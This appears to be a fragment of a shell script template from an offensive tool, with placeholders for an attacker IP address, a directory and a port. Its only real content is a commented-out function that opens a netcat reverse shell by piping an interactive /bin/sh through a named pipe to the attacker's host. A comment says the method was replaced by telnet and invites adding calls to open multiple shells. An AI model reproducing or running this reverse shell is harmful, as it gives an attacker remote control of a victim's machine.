set -euo pipefail

########################################
# Create a netcat tunnel (this method is not used anymore in favour of telnet)
########################################
# create_tunnel() {{
#   file=$1
#   port=$2
#   rm -rf $file; mkfifo $file;cat $file|/bin/sh -i 2>&1|nc {attacker_ip_address} $port >$file
# }}

# create_tunnel "{directory}" "{port}"
# Add more calls to create_tunnel here if you want to open multiple shells


